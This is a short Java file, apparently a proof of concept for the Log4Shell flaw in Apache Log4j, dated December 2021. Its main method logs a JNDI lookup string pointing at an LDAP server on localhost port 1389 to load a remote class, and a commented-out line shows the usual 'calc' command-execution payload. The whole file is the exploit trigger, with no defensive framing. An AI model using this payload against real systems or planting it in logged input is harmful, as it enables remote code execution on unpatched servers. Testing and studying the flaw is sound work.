
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;

/**
 * @author: Sparks
 * @Date: 2021/12/12 14:09
 * @Description
 */
public class Main {

    private static final Logger log = LogManager.getLogger(Main.class);

    public static void main(String[] args) throws IOException {
        log.error("${jndi:ldap://127.0.0.1:1389/badClassName}");
        //Runtime.getRuntime().exec("calc");
    }
}
